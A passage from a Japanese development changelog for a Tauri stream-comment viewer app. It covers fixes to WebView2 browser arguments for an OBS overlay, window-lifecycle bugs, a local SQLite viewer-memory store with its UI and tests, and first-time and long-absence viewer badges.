  wry 既定引数のまま、`comment-overlay` だけ独自引数だったため不一致で失敗していた。
  根拠: tauri-utils 2.9.3 `config.rs` の `data_directory` 注記「**Windows**: WebViews with different values for settings
  like `additionalBrowserArgs` … must have different data directories」／ tauri#11144 ／ Microsoft WebView2 の UDF 制約。
  ※ macOS(WKWebView) は窓ごと独立＋additional_browser_args は WebView2 専用で無視されるため、開発機(macOS)で顕在化せず。
- **修正**: UDF は分けず（＝設定同期の localStorage 共有を維持）、**3 窓すべてで同一の `additional_browser_args` に揃える**。
  Rust に共有定数 `SHARED_BROWSER_ARGS`（`--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection,CalculateNativeWinOcclusion`）を新設し、
  `open_comment_viewer_window` / `open_comment_overlay_window` の Builder に付与、`main` は `tauri.conf.json` の
  `app.windows[0].additionalBrowserArgs` に同一文字列を設定。最初に生成される `main` にこの引数を効かせることで、共有
  ブラウザプロセスで `CalculateNativeWinOcclusion`（完全に隠れた窓の描画停止最適化）が無効になり、最背面
  (`always_on_bottom`)の overlay も描画継続 → OBS ウィンドウキャプチャが黒くならない（追修正③ 本来の目的が初めて成立）。
- **引数の内訳変更**: 当初 overlay に入れていた `msWebView2AutoDetectHighContrast` は共有集合から外した（`main` の実 UI の
  ハイコントラスト自動追従を損なわないため）。**wry の Windows 既定を完全保持**＝`--disable-features=msWebOOUI,msPdfOOUI,`
  `msSmartScreenProtection`（既定 3 種）＋ `--autoplay-policy=no-user-gesture-required`（wry は `autoplay=true` のとき既定で付与。
  `additional_browser_args` を指定すると wry の既定生成クロージャが走らず**これも一緒に落ちる**ため明示保持）に、占有解除に必須の
  `CalculateNativeWinOcclusion` のみを追加する。**レビュー反映（2026-07-24）**: 当初版は autoplay-policy を落としており、Windows で
  comment-viewer の VOICEVOX 読み上げ（Web Audio の AudioContext）がユーザー操作前に鳴らなくなり得たため、明示保持に修正した
  （macOS は additionalBrowserArgs が no-op で影響なし。ttsQueue は gesture 契機 resume で防御済みだが、従来 wry 既定挙動の非退行を優先）。
  **同期注意**: JSON はコメント不可のため、`SHARED_BROWSER_ARGS` と `tauri.conf.json` の文字列はバイト単位で一致させること
  （片方だけ変更すると再び窓生成失敗を招く）。定数 doc にクロスリファレンスを記載。
- **security 自己確認（指摘なし）**: OS/プロセス/ファイル操作の変更なし。宛先・API・capability・依存・CSP を増やさない
  （UDF を分けないため新規 data_directory も作らない）。additionalBrowserArgs は当該窓 WebView2 の描画最適化を切るのみで
  攻撃面を増やさない。SmartScreen 無効化は wry 既定を保持しただけ（tauri#1345 由来・§1 の no-external-comms と整合）。
- **やらないこと**: overlay 専用 data_directory 化（localStorage 同期が壊れ Tauri イベント移行が必要になるため不採用）／
  `always_on_bottom` 等 UX の変更／意匠・データ取得・sidecar 連動の変更／新規ライブラリ追加。
- **Windows 実機検証（未実施・マージ条件）**: 開発機が macOS のため実機確認をマージ条件とする。①overlay 窓が開く
  ②`main`/`comment-viewer` も開く（回帰なし）③OBS のウィンドウキャプチャ（WGC＋透過許可）でコメントが色付きで映り
  **真っ黒でない** ④切り分け＝`CalculateNativeWinOcclusion` を外すと黒に戻るか。残黒時の次手は
  `--disable-backgrounding-occluded-windows` の併用。⑤macOS 回帰＝従来どおり全窓開き透過取り込みできる（no-op）。
  ⑥comment-viewer の VOICEVOX 読み上げが Windows でも鳴る（autoplay-policy 保持の確認。少なくとも接続操作＝ユーザー gesture 後）。

### 変更ファイル（033f 追修正③ 回帰修正）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（`SHARED_BROWSER_ARGS` 新設・viewer/overlay Builder に付与・doc 更新）
- 設定（変更）: `apps/desktop/src-tauri/tauri.conf.json`（`main` 窓に同一 `additionalBrowserArgs` を追加）

### 034f 不具合修正: オーバーレイ表示トグルが消えない／本体×で子窓・sidecar が残る

動作確認中に見つかった2件の窓ライフサイクル不具合を修正。

#### 問題1: 「OBSオーバーレイを表示」トグルが2回目で非表示にならない

- **原因**: ON 時に comment-viewer webview から comment-overlay 窓へ **cross-window の `onCloseRequested` 購読**を張っていた
  （CommentViewerApp.tsx）。OFF 時に Rust `close_comment_overlay_window`→`window.close()`→`CloseRequested` が出ると、
  Tauri core は **JS 購読があると `api.prevent_close()`**（tauri 2.11.5 `manager/window.rs`）でネイティブ close を抑止し
  JS へ委譲する。JS ラッパは preventDefault されないと `destroy()`（`plugin:window|destroy`）を呼ぶが、これは
  `core:window:allow-destroy` 権限が必要で comment-viewer の capability は `core:default` のみ→**ACL 拒否**→窓が破棄されず、
  state は OFF なのに窓は表示されたまま、になっていた。
- **修正（frontend のみ・アプローチ 1b）**: `CommentViewerApp.tsx` の cross-window `onCloseRequested` 購読・`overlayUnlistenRef`・
  `WebviewWindow` import を撤去。`handleOverlayToggle` は ON=open→state、OFF=Rust `close()`→state のみに単純化。JS の
  close-requested 購読が無くなれば Tauri は prevent_close せず、Rust `window.close()`（capability 非依存の直接 API）が
  overlay をそのまま破棄する。外部閉じの即時同期は失うが、overlay は枠なし・非フォーカス・最背面で手動 close 手段が
  実質無く、再オープン時はマウント同期（`isCommentOverlayOpen`）で復元されるため実害なし。**capability/CSP/依存の変更なし**。

#### 問題2: 本体（main）を×で閉じてもアプリ・子窓・sidecar が終了しない

- **原因**: Tauri v2 の既定は「全ウィンドウが閉じたときのみアプリ終了」。`main` 窓に close ハンドラが無く、`main` を閉じても
  子窓（comment-viewer / comment-overlay）が残るとアプリが「全窓クローズ」に到達せず、`RunEvent::Exit`（sidecar 停止）も
  発火しなかった。sidecar 停止の全契機（①comment-viewer 窓 close ②`RunEvent::Exit` ③sidecar 側 ppid 監視）が
  どれも「main を閉じただけ」では発火しない。**元からの未実装**（overlay 追加で子窓が2枚になり顕在化。回帰ではない）。
- **修正（Rust）**: `lib.rs` の setup() の main 窓ブロックに `window.on_window_event`（`CloseRequested`→`app.exit(0)`）を追加。
  `app.exit(0)` で全窓破棄＋既存 `RunEvent::Exit` 到達→`comment_sidecar::shutdown` まで連動。main の close ボタンは
  `getCurrentWindow().close()`（Header.tsx）で CloseRequested を出し、main は JS 購読を持たず prevent_close されないため届く。
  「main＝本体を閉じたら全部落とす」UX（macOS の常駐慣習よりユーザー要望を優先）。子窓だけ閉じた場合は従来どおりアプリは残る。

#### 変更ファイル（034f）

- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（overlay トグルの cross-window 購読撤去・単純化）
- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（main 窓に CloseRequested→app.exit(0) ハンドラ追加）

#### 検証（Mac / Windows 両方・実機）

- 問題1: トグル ON→表示→再押下(OFF)で **overlay が消える**／ON/OFF 反復で毎回切替／viewer 再オープンで実状態に再同期。
- 問題2: main を×で閉じる→**comment-viewer・OBSオーバーレイが両方消えアプリ終了**／タスクマネージャ・アクティビティモニタで
  **comment-sidecar が残らない**／子窓だけ閉じた場合は従来どおりアプリ生存。Windows は自作×、macOS はネイティブ赤ボタンで確認。

## 2026-07-25 (038a 視聴者メモリ Rust データ基盤: 保存・集計・コマンド)

コメントビューアに「一度コメントした視聴者を記憶する」機能（親 038）の土台として、受信済みコメントを Rust に渡して
視聴者ごとに upsert・集計し、一覧/詳細/メモ/削除の Tauri コマンドを提供する **端末内 SQLite の保存基盤**を実装した。
**§9「取得コメントを DB に保存しない」を視聴者メモリに限って解禁**（限定・同意・レビュー付き）。038b（UI）・038c（バッジ）・
040（ROM 突合）のデータ源になる。

### 確定スキーマ（`viewer_memory/repository.rs::init`・`CREATE TABLE IF NOT EXISTS`）

- **`viewers`**: `id`（PK・安定キー `provider:providerUserId`）／`provider`／`provider_user_id`／`name`／`first_seen_at`／
  `last_comment_at`／`total_comments`／`bits_count`／`bits_amount`／`superchat_count`／`superchat_amount`／
  `superchat_currency`／`subscription_count`／`is_member`／`last_subscription_at`／`note`／`created_at`／`updated_at`。
  アバターは非保存（アイコンは overlay 意匠のみ・§9）。
- **`viewer_comments`**: `id`（PK＝コメント id＝冪等化キー）／`viewer_id`（FK `REFERENCES viewers(id) ON DELETE CASCADE`）／
  `session_id`／`source`／`text`／`event_type`／`amount`(REAL,null可)／`currency`(TEXT,null可)／`monetary_amount`(TEXT,表示用)／
  `published_at`／`created_at`。索引 `idx_viewer_comments_viewer` / `idx_viewer_comments_session`。
- FK CASCADE は既存 setup の接続別 `PRAGMA foreign_keys = ON`（lib.rs）で有効。

### record_comment と冪等化・集計

- コマンド `record_comment(comment: CommentViewDto, session_id) -> AppResult<()>`。frontend（`CommentViewerApp` の
  `onComments`／`mergeComments` の `added`＝`enqueueForSpeech(added)` の直後）で呼ぶ。**overlay 窓は `added` を使わない
  読み取り専用 WS のため、記録は CommentViewerApp のみ**（二重記録回避）。
- 冪等化: repository が `unchecked_transaction` 内で ① `INSERT OR IGNORE INTO viewer_comments`（コメント id 一意）→ 0 行
  なら視聴者/集計を触らず終了 ② 新規時のみ視聴者を upsert（名前最新化）③ 集計を **viewer_comments から再計算**（増分ドリフト
  無し）。単一 `Mutex<Connection>` で全 DB コマンドが直列化されるため二重記録で集計が重複しない。
- 集計規則: bits=`currency='BITS'` の COUNT/SUM、スパチャ=`event_type='superchat' AND currency<>'BITS'` の COUNT/SUM、
  first/last=MIN/MAX(`published_at`)、サブスク=`event_type='subscription'` の COUNT＋`is_member`。

### session_id 方針

- **窓マウント毎に 1 つ**（`CommentViewerApp` で `crypto.randomUUID()` を `sessionIdRef` に遅延採番、窓の全 record に付与）。
  **専用 session テーブルは作らない**（`viewer_comments.session_id` 列で束を識別）。端末外へ出さないローカル ID。

### ワイヤ拡張（数値・glue のみ／vendor 非改修）

- 回数/合計額の正確化のため `comment_viewer/model.rs` の `CommentViewDto` に数値 `monetary: Option<CommentMonetaryDto{amount:f64, currency:String}>`
  を **追加**（表示用 `monetary_amount: Option<String>` は温存＝加算的・後方互換）＋ command 引数化のため DTO 群に `Deserialize` を追加・
  ヘッダ注記を「record_comment 受け口・§9 限定解禁」に更新。
- sidecar は `apps/comment-sidecar/src/wire.ts`（`CanonicalComment.monetary` 追加・`toCanonicalComment` で既にある数値
  `{amount,currency}` を捨てず通す）と `dev-mock.ts`（モック数値化）**のみ**改修。**vendor（osareview 派生）は非改修**＝
  サブスク/メンシプの累計月数は取得せず近似（`is_member`＋イベント回数）。**通信面（宛先・fail-closed）は不変**。

### 追加コマンド・bindings

- `record_comment`／`list_viewers(input?)`（検索＋並び替え）／`get_viewer`（本人＋過去コメント）／`update_viewer_note`／
  `delete_viewer`／`clear_viewers` を `generate_handler!` に登録。ts-rs DTO（`ViewerRecord`/`ViewerCommentRecord`/`ViewerDetail`/
  `ListViewersInput`/`ViewerSort`）を `src/features/viewer-memory/bindings/` に出力。`CommentViewDto` に `monetary`／新 `CommentMonetaryDto` 追加。
  frontend ラッパ `features/viewer-memory/viewerMemoryApi.ts`（6 コマンド。038a で呼ぶのは `recordComment` のみ・他は 038b 用）。
  `package.json` の `check:bindings` に viewer-memory を追加。**capability 追加なし**（comment-viewer は `core:default` のまま）。

### security.md 保存範囲明文化

- §9 に「追補（038a・視聴者メモリの端末内保存＝限定解禁）」、「## コメントビューア方針」に **⑪**（保存範囲・端末内 SQLite のみ・
  端末外非送信・削除手段 `delete_viewer`/`clear_viewers`・no-internet 境界不変・入力検証・ログ非露出・アバター非保存）、④ に例外注記、
  「レビュー必須条件」に視聴者情報の端末保存を追加。

### security-review 結果

- **問題なし（修正必須なし）**。外部通信ゼロ／capability 不変／最小権限コマンド／Rust 側入力検証＋パラメータバインド／
  ログ非露出／削除・全消去あり／依存追加なし。後回し可の軽微指摘のみ（amount/currency の制御文字検証は sidecar 生成値で
  実害無し・record_comment の error ログ頻度・スパチャ混在通貨の近似は per-row 保持で後計算可）。

### 検証結果

- `cargo check`（Rust・OK）／`pnpm gen:bindings`（意図した drift のみ・再実行で追加 drift 無し）／`pnpm typecheck`（OK）／
  `pnpm lint`（OK）／sidecar `typecheck`（wire.ts/dev-mock.ts・OK）。
- **`build:sidecar`（SEA）は未完**: 焼き込み必須値 `TWITCH_CLIENT_ID`/`YOUTUBE_CLIENT_ID`/`YOUTUBE_CLIENT_SECRET` が未設定だと
  ビルド script が fail-closed で停止する既存ガードのため。実配布ビルドは値を渡して実行する
  （`TWITCH_CLIENT_ID=… YOUTUBE_CLIENT_ID=… YOUTUBE_CLIENT_SECRET=… pnpm --filter ./apps/desktop build:sidecar`）。TS 型は typecheck 済み。
- **実機（Mac・未実施＝ユーザー環境で確認）**: コメント取得→視聴者行 upsert・総数/最終日時/投げ銭集計更新／`list_viewers`・
  `get_viewer` が値を返す／メモ更新・削除・全消去／同一コメント二重記録で集計非重複／`lsof -i` で外部ソケットが sidecar のみ。

### 変更ファイル（038a）

- Rust（新規）: `src-tauri/src/viewer_memory/{mod,model,repository,service,commands}.rs`
- Rust（変更）: `src-tauri/src/lib.rs`（mod・init・generate_handler!）／`src-tauri/src/comment_viewer/model.rs`（Deserialize・monetary・ヘッダ）
- sidecar（変更）: `apps/comment-sidecar/src/{wire.ts,dev-mock.ts}`
- frontend（新規）: `src/features/viewer-memory/{viewerMemoryApi.ts,types.ts,bindings/*}`
- frontend（変更）: `src/screens/comment-viewer/CommentViewerApp.tsx`（sessionIdRef＋record 配線）／
  `src/features/comment-viewer/bindings/{CommentViewDto.ts,CommentMonetaryDto.ts}`（再生成）／`package.json`（check:bindings）
- docs（変更）: `docs/security.md`

## 2026-07-25 (038b 視聴者一覧・詳細 UI ＋配信者メモ)

### やったこと

- 038a で端末内保存・集計した視聴者データを、コメントビューア（配信者だけが見る窓）で**閲覧・メモ編集できる UI** を追加。
  **表示専用**（invoke のみ・WS/TTS/sidecar 制御を持たない・SettingsView と同じ流儀）。Rust 変更・新規コマンドはゼロで、
  038a の既存ラッパ（`features/viewer-memory/viewerMemoryApi.ts`）を叩くだけ。

### ビュー構成（`view` に `"viewers"` 追加）

- `CommentViewerApp` の `view` union を `"comment" | "settings" | "viewers"` に拡張。ツールバー右クラスタに設定ギアと同パターンの
  「👥 視聴者」ゴーストボタン（`styles.settingsBtn` 再利用）を追加し `setView("viewers")`。レンダ分岐を三分岐化。
  **WS/TTS/sidecar/overlay state・単一 WS effect・`recordComments` 書込経路には触れず**（窓内 WS 1 本原則を維持）。
- 新規 `ViewersView.tsx`（自己完結の表示専用）: 内部 state `selectedId` で **一覧⇄詳細**を切替（トップレベル view は増やさない）。
  props は `onBack` のみ。ヘッダは `settingsHeader`/`iconBtn`(←)/`settingsTitle` を再利用。

### 一覧の項目

- 検索ボックス（250ms debounce）＋並び替え `Select`（`ViewerSort`＝最終コメント順/総コメント数順/名前順）＋更新ボタン。
  検索/並びは**サーバ側** `list_viewers({ search, sort })` に渡す（client 側フィルタはしない）。
- 7 列 grid テーブル（`<table>` 用スタイルは既存に無いため grid で構成）: チェックボックス／名前／サイト名バッジ
  （`srcTwitch`/`srcYoutube` 再利用）／総コメント数／bits 額／スパチャ額（＋通貨）／最終コメント日時。ヘッダに全選択チェック。
  行クリック（チェックボックス以外）で詳細へ。

### 詳細の項目・メモ編集

- `get_viewer(id)` で `ViewerDetail`（本人＋過去コメント・新しい順）を取得。集計カード＝サイト・総数・bits（回数/額）・
  スパチャ（回数/額＋通貨）・**サブスク/メンシプ**（メンバー状態＋回数＋最終日時。※038a は累計月数を未取得＝近似・security.md ⑪）・
  初回/最終コメント日時。過去コメントは `.item`/`.meta`/`.badge`/`.amount`/`.text` を流用した自前マークアップで描画
  （`CommentList` は `CommentViewDto[]` 前提で型が合わないため）。
- 配信者メモ: `textarea` ＋「保存」ボタン → `update_viewer_note(id, note)` → 返る `ViewerRecord` で表示更新（未変更時は保存ボタン無効）。
  入力検証は 038a（Rust）に委譲。

### 破壊的操作の確認 UX（ユーザー確認済み）

- **個別削除のみ** UI に出す。詳細の「この視聴者を削除」＋一覧の**チェックボックス複数選択→「選択した N 件を削除」**バー。
  **全消去（`clear_viewers`）の UI は作らない**（`clearViewers` ラッパは未使用のまま温存）。削除機能を残す根拠
  （本人からの削除依頼対応・荒らし記録の除去・誤記録リセット、かつ security.md ⑪/038 が削除手段を必須プライバシー手段と明記＝
  §9 保存解禁の条件）はユーザーと合意。
- 削除前は**必ず確認ダイアログ**を経由。新規 `ConfirmDialog.tsx`＝ネイティブ HTML `<dialog>`＋`showModal()`（focus trap/Esc/
  backdrop が標準・**新規依存なし**）。一括削除は 038a に一括コマンドが無いため `deleteViewer` を選択分 `Promise.allSettled` ループ呼び→
  一覧再取得＋選択解除、失敗は件数のみ表示（本文・詳細は非露出）。

### invoke ラッパ（新設せず既存を消費）

- タスク文が想定した `features/comment-viewer/viewerMemoryApi.ts` の新設は**不要**だった。038a が
  `features/viewer-memory/viewerMemoryApi.ts` を作成済みのため、そこから `listViewers`/`getViewer`/`updateViewerNote`/`deleteViewer` を
  import して使用（重複作成しない）。型は barrel `features/viewer-memory/types.ts` から取得。

### security-review 結果（軽）

- **問題なし（修正必須なし）**。frontend 表示＋メモ更新の invoke のみで、外部通信宛先・API・capability・依存・`csp: null` は不変
  （`*.json`/`src-tauri`/`package.json`/`pnpm-lock.yaml` 無変更）。CSS は theme.css 役割トークンのみ（生 hex/rgba・data-URI 無し。
  ダイアログ scrim は既存 `--tutorial-dim` を流用）。視聴者本文/名前/メモ/投げ銭履歴は画面表示のみ・端末外へ出さず、
  新規ファイルに `console.*` ゼロ・失敗時は固定安全文言と件数のみ。破壊的操作は確認ダイアログ経由・全消去 UI は無し。XSS は React
  テキスト描画（`dangerouslySetInnerHTML` 不使用）。後回し可: 一括削除の invoke 件数（表示中の視聴者数で上限・実害小）。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck`（OK）／`pnpm --filter ./apps/desktop lint`（OK）。
- `git diff --stat`: 変更 2（`CommentViewerApp.tsx` +26 / `CommentViewerApp.module.css` +252）＋新規 2（`ViewersView.tsx`/`ConfirmDialog.tsx`）。
- **実機（Mac・未実施＝ユーザー環境で確認）**: コメント取得→「👥 視聴者」で一覧→詳細を開き、集計値（総数/サイト/bits/スパチャ回数・額/
  サブスク回数・メンバー状態）・過去コメント・メモ保存が動く。個別削除（確認ダイアログ）＋チェック複数選択→まとめて削除（確認ダイアログ）が動く。

### 変更ファイル（038b）

- frontend（新規）: `src/screens/comment-viewer/ViewersView.tsx`／`src/screens/comment-viewer/ConfirmDialog.tsx`
- frontend（変更）: `src/screens/comment-viewer/CommentViewerApp.tsx`（view union＋視聴者導線＋レンダ分岐）／
  `src/screens/comment-viewer/CommentViewerApp.module.css`（視聴者 UI 用クラス追加）
- Rust・capability・依存・`tauri.conf.json`（`csp: null`）: **無変更**

## 2026-07-25 (038b フォローアップ: レビュー対応＋自動テスト基盤)

### レビュー対応（apply-review）

- 品質 #1（Blocker）: `ConfirmDialog` の `useEffect` 依存を `[]`→`[open]` に修正。open=false→true で `showModal` が
  再実行されず削除確認が表示されなかった不具合（`return null` はアンマウントではなくインスタンス生存のため `[]` だと
  初回 open=false 時に一度きり）。`if (open && !dialog.open)` ガードで二重 `showModal`（InvalidStateError）も防止。
- #2 行 `role="button"` に checkbox ネスト（a11y）／#3 一括削除 per-id ループ／#4 ConfirmDialog 二重定義 は
  「意図・許容理由・再修正トリガー」をコメントで残して現状維持（修正不要）。

### 自動テスト基盤（vitest + Testing Library + jsdom）を desktop に導入

- 依存追加（**devDependencies のみ**・実行時依存/外部通信/OS 操作は増やさない・§10）: `vitest`／`@testing-library/react`／
  `@testing-library/dom`／`@testing-library/jest-dom`／`jsdom`。理由＝React コンポーネント/DOM 挙動（#1 の showModal 回帰・
  ViewersView の状態機械）はフレームワーク無しでは自動化不可のため。**ユーザー承認済み**。
- 設定: `vitest.config.ts`（jsdom）／`src/test/setup.ts`（jest-dom 登録・jsdom 未実装の `<dialog>` showModal/close ポリフィル・
  RTL cleanup）。スクリプト: `test`（=vitest run）／`test:watch`。
- 純ロジックは `viewerFormat.ts` へ切り出して単体化（振る舞い不変の抽出）。当初検討した zero-dep `.mjs`+tsc 方式は
  vitest 導入に伴い撤去し **desktop は vitest に一本化**（sidecar は従来の `.mjs` イディオムのまま）。
- テスト: `viewerFormat.test.ts`（整形/ラベル/金額/日時の仕様）／`ConfirmDialog.test.tsx`（**#1 回帰ガード**・確認/キャンセル/
  busy/Esc）／`ViewersView.test.tsx`（一覧・検索 debounce のサーバ委譲・詳細/メモ保存・**削除は確認ダイアログ確定後にのみ
  command を呼ぶ**・一括削除は選択分だけ）。invoke ラッパは全て `vi.mock`（端末外通信ゼロ）。**24 tests 全 PASS**・typecheck/lint OK。
- テスト作成方針を skill 化: `.claude/skills/write-tests`（**「仕様としてこうあるべき」を最優先／テストを通すためのケースは作らない**）。
- jsdom で再現しきれない `<dialog>` の focus trap/backdrop/Esc・webview 固有挙動は **E2E（手動）** で確認する。
- `docs/security.md` は無変更（保存ポリシー・宛先・capability・`csp: null` 不変。テスト devDeps はセキュリティ境界を越えない）。

## 2026-07-26 (038b E2E 修正 Phase A: 軽微 UI 5 件)

E2E フィードバック 6 件のうち、軽微な UI 修正 5 件を先行実装（大きい④コメント→詳細連携は Phase B で別作業）。
ユーザー確認済み方針: ④はスプリット表示／⑤はネイティブ title 修正／2 段階実装。

- **① サイト列の横幅**: `.viewerHead, .viewerRow` の 3 列目 `auto`→固定 `76px`。head と各 row は別グリッドで `auto` だと
  内容依存に幅が変わりヘッダ↔行がズレていた。固定列にして全列を整列（`CommentViewerApp.module.css`）。
- **② 削除文言をやわらげる**: 詳細ボタン「この視聴者を削除」→「この視聴者の情報を削除する」。カード見出し「削除」→
  「情報の削除」、注記・確認ダイアログ（title/message）も「情報を削除」の言い回しに統一（`ViewersView.tsx`）。※Phase B で
  詳細を `ViewerDetailPanel` へ移設する際この文言を引き継ぐ。テスト（削除ボタン名）も新ラベルへ更新。
- **③ アイコンを SVG に統一**: ツールバーの ⚙/👥 絵文字を、アプリ規約のインライン SVG（`currentColor`・`viewBox 0 0 24 24`・
  外部リソースなし）へ置換。`GearIcon`/`ViewersIcon` をローカル関数コンポーネントで新設（`ToolRow`/`Header` と同慣習）。
  `.settingsBtn` の色（muted→hover text）を currentColor で継承＝設定・視聴者が同一トーンに揃う（`CommentViewerApp.tsx`）。
- **⑤ ツールチップ文言**: 👥 の `title`/`aria-label`「視聴者」→「視聴者一覧」。⚙ は「設定」のまま（ネイティブ title・既存流儀）。
- **⑥ 詳細ユーザー名を大きく**: `.settingsTitle`(14px) は一覧・設定と共用のため、詳細名専用クラス `.viewerDetailName`
  (21px/800・ellipsis) を新設し詳細の h1 にだけ重ねる（`CommentViewerApp.module.css`／`ViewersView.tsx`。h1 のまま）。
- 検証: `typecheck`/`lint`/`test`（24 全 PASS）OK。Rust・capability・依存・`csp: null`・`docs/security.md` は**無変更**。
- 手動 E2E 確認予定: 列整列／SVG アイコンのトーン統一／ホバー文言／詳細名の大きさ／削除文言。

### Phase A 微調整（ユーザー依頼）

- **一覧の中央寄せ**: サイト・総数・bits・スパチャの 4 列を、ヘッダ・値とも中央寄せに（`.vNum` を右寄せ→中央、
  サイト用に `.vSite`(center) を新設しヘッダ/行の span に付与）。名前・最終コメント・チェックは変更なし。
- **詳細ヘッダの固定**: `.settingsView`（`overflow-y:auto` のスクロールコンテナ）先頭の詳細ヘッダに `.stickyHeader`
  (`position:sticky; top:0; z-index:2; background:var(--bg)`) を付与し、スクロールしても ← 戻る＋名前が上部に残る。
  共用クラス `.settingsHeader` は据え置き、詳細ヘッダにだけ modifier を重ねた（一覧・設定ヘッダは不変）。
- 併せて一覧側の確認ダイアログ title も「視聴者の削除」→「視聴者の情報を削除」に統一（②の取りこぼし修正）。
- 検証: `typecheck`/`lint`/`test`（24 PASS）OK。

## 2026-07-26 (038b E2E 修正 Phase B: ④ コメント→視聴者詳細スプリット)

流れるコメントをクリック→その視聴者の詳細をコメント本体の右にスプリット表示（コメントは裏で流れ続ける）。
ユーザー確認済み方針: 右スプリット表示（狭い窓では詳細を全幅オーバーレイ）。**Rust・依存・capability・`csp:null` は無変更**。

- **B-1 `viewerIdOf`**（`viewerFormat.ts`・純関数）: コメントから安定キー `` `${source}:${author.id.trim()}` `` を導出。
  Rust `viewer_memory/service.rs` の key 生成と一致（trim 必須）。→ コメントクリックで `getViewer(id)` を引ける。
- **B-2 CommentList に `onSelect`**: 既定バリアントの行を、`onSelect` 指定時のみクリック可能化（cursor/role=button/
  Enter・Space）。未指定なら従来どおり表示専用（overlay 変種は非対象＝OBS 表示は不変）。`.itemClickable` を新設。
- **B-3 `ViewerDetailPanel` 抽出**: 詳細（集計・メモ・過去コメント・個別削除＋ConfirmDialog・loading/error）を
  再利用コンポーネントへ切り出し、ViewersView とコメビュ本体サイドパネルの両方から使う。`onDismiss`＋`dismissKind`
  ("back" ←／"close" ×)＋`onDeleted`。**NotFound を含む取得失敗は固定安全文言のみ**（コメント受信直後は best-effort
  記録が未反映のことがある旨を案内・§9）。ViewersView は一覧＋まとめて削除だけを持つ形にスリム化（個別削除は panel へ移設）。
- **B-4 スプリットレイアウト**（`CommentViewerApp`）: comment 分岐に state `selectedViewerId` と 2 カラム（`.commentSplit`
  ＝左 `.commentPane`（CommentList）／右 `.detailPane`（ViewerDetailPanel））を追加。`onSelect` で id をセットするだけで
  **WS/comments/recordComments/sessionIdRef には触れない**（受信は不変）。`@media (max-width:600px)` で詳細を全幅
  オーバーレイに切替。既存の 👥 フルビューは併存。
- **B-5 テスト**（仕様ベース・invoke は全て `vi.mock`）: `viewerIdOf`（連結/trim）／`CommentList`（onSelect 発火・未指定時
  非インタラクティブ）／`ViewerDetailPanel`（詳細表示・**NotFound 安全文言**・メモ保存・削除は確認後のみ＋onDeleted・× 閉じる）。
  既存 `ViewersView.test.tsx` は panel 経由でそのまま通る（integration）。**全 33 tests PASS**・typecheck/lint OK。
- セキュリティ: 新規の外部通信・宛先・依存・capability・`csp:null`・Rust・`docs/security.md` は**無変更**。CommentList クリック→
  id 導出→`getViewer`（既存 invoke）のみ＝端末内・表示専用。console 出力なし・失敗時は固定安全文言のみ（§9）。
- 実機 E2E 確認予定: コメント受信中に 1 件クリック→右に詳細／裏でコメントが流れ続ける／× で閉じる／未記録直後は
  「記録が見つかりませんでした」／狭い窓では全幅オーバーレイ／👥 フルビューも従来どおり。

## 2026-07-26 (038c 初見／久しぶり バッジ＋枠色)

コメントビューア本体（`variant="default"`）で、**初見**（初コメント）と**久しぶり**（最終コメントから 1 ヶ月以上
経過後の最初のコメント）の視聴者が一目で分かるよう、該当コメント行に**枠色**＋「初見」「久しぶり」**バッジ**を出す。
判定は 038a の Rust 側（保存直前の `last_comment_at` を持つ）で行い `record_comment` の戻り値で frontend へ返す。
これで 038 系（038a データ基盤・038b 一覧/詳細・**038c バッジ**）が完了。**外部通信・依存・capability・`csp:null`・
保存範囲は無変更**（判定は行に永続化せず都度算出＝新規保存項目ゼロ）。

- **判定ロジック（Rust・保存直前・初回のみ）**（`viewer_memory/repository.rs`）: `record_comment` のトランザクション内で
  **upsert（step1）より前に**直前 `last_comment_at` を SELECT。記録なし→**初見**（`first_time`）／記録あり かつ
  `今回 published_at >= 直前 last_comment_at + 1 ヶ月`→**久しぶり**（`long_absence`）。初見が優先で排他。1 ヶ月境界は
  **既存依存 `chrono`** の `DateTime::parse_from_rfc3339` + `checked_add_months(Months::new(1))`（新規依存なし・月末は
  クランプ・パース不能は false に落として誤バッジ回避）。判定時刻は `published_at`（集計の first/last と整合・テスト決定的）。
- **冪等方式（二重記録でバッジがブレない）**: 全 command は単一 `Mutex<Connection>` で直列化＝同一 id は 1 つだけ実挿入
  （`INSERT OR IGNORE` inserted==1）。**判定は upsert 前の状態で確定し `inserted==1` のときだけ肯定を返す**。重複
  （inserted==0）は必ず `{false,false}`。frontend も**肯定判定のみ Map に格納・否定で上書きしない**ため、StrictMode の
  updater 二重実行・fire-and-forget の重複解決でも肯定は 1 度きり。
- **戻り値 DTO 拡張**（`model.rs`）: `RecordResult { firstTime, longAbsence }`（真偽 2 値のみ・ts-rs export）。
  `record_comment` の戻り値を repository `Result<RecordResult>` / service `AppResult<RecordResult>` /
  command `AppResult<RecordResult>` に変更（現行 `()`/`bool` を置換）。bindings 再生成で `RecordResult.ts`（新規）＝
  既存 bindings drift ゼロ。`log_command_err` は T ジェネリックのため無変更。
- **結果伝達（fire-and-forget 維持）**（`viewerMemoryApi.ts` / `CommentViewerApp.tsx`）: `recordComment→Promise<RecordResult>`。
  `recordComments(comments, sessionId, onResult?)` に任意コールバックを追加（各 Promise 解決時に `comment.id` 付きで判定を通知・
  失敗は従来どおり握り潰し・表示/読み上げを止めない）。`CommentViewerApp` に `viewerBadges: Map<id, RecordResult>` state と
  安定 `handleRecordResult`（`useCallback []`・肯定のみ格納）を追加し、`setComments` updater 内の `recordComments` に渡す。
  WS/comments/enqueueForSpeech/sessionIdRef は不変（`handleRecordResult` は安定なので WS effect の deps に足しても再接続なし）。
- **表示（default 限定・既存意匠不変）**（`CommentList.tsx` / `CommentViewerApp.module.css`）: `badges?: ReadonlyMap<id, RecordResult>`
  prop を追加し、**`renderDefaultItem` のみ**で該当 id に枠色クラス＋「初見/久しぶり」バッジを重ねる（非該当・未指定・overlay 変種は
  無装飾）。色は**役割トークンのみ**（生 hex/rgba なし）＝初見=`--ok`（緑）／久しぶり=`--info`（青）で、サイトバッジ（accent紫/danger赤）・
  金額（warn）と被らない。枠色は `.item` の後に `.itemFirstTime`/`.itemLongAbsence` の `border-color` 差し替えのみ（サイズ/背景不変）。
- **テスト**（`repository.rs`・仕様ベース）: 既存 2 件（初回/重複）を `RecordResult` 参照へ更新＋038c 判定 5 件追加
